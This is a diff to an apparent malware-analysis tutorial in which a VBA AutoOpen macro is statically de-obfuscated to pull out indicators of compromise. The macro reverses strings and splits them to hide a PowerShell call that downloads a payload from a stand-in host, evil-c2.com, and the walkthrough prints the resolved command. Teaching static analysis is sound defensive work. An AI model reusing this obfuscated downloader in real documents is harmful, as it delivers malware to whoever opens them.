@@ -706,7 +706,7 @@ Attackers know SOC analysts use \`olevba\`. When I opened \`macro_code.vba\`, I 
 \`\`\`vba
 Sub AutoOpen()
     Dim Xjh2 As String
-    Xjh2 = StrReverse("exe.tsohswop\23met\c:\")
+    Xjh2 = StrReverse("exe.tsohswop\\23met\\c:\\")
     Dim Kp91 As String
     Kp91 = "h" & "t" & "t" & "p" & ":" & "//" & "evil-c2" & ".com" & "/payload"
     Shell(Xjh2 & " -c (New-Object Net.WebClient).DownloadFile(" & Kp91 & ")")
@@ -715,9 +715,9 @@ End Sub
 
 ### Static De-obfuscation
 Instead of dynamically running this, we can mechanically trace the variables:
-1. \`StrReverse("exe.tsohswop\\23met\\c:\\")\` evaluates to \`c:\\temp32\\powershell.exe\`
+1. \`StrReverse("exe.tsohswop\\\\23met\\\\c:\\\\")\` evaluates to \`c:\\\\temp32\\\\powershell.exe\`
 2. The string concatenation in \`Kp91\` evaluates to \`http://evil-c2.com/payload\`
-3. The final \`Shell\` command evaluates to: \`c:\\temp32\\powershell.exe -c (New-Object Net.WebClient).DownloadFile(http://evil-c2.com/payload)\`
+3. The final \`Shell\` command evaluates to: \`c:\\\\temp32\\\\powershell.exe -c (New-Object Net.WebClient).DownloadFile(http://evil-c2.com/payload)\`
 
 ### Hunting the IoCs
 By doing this statically, we safely acquired two critical IoCs without detonating the payload:
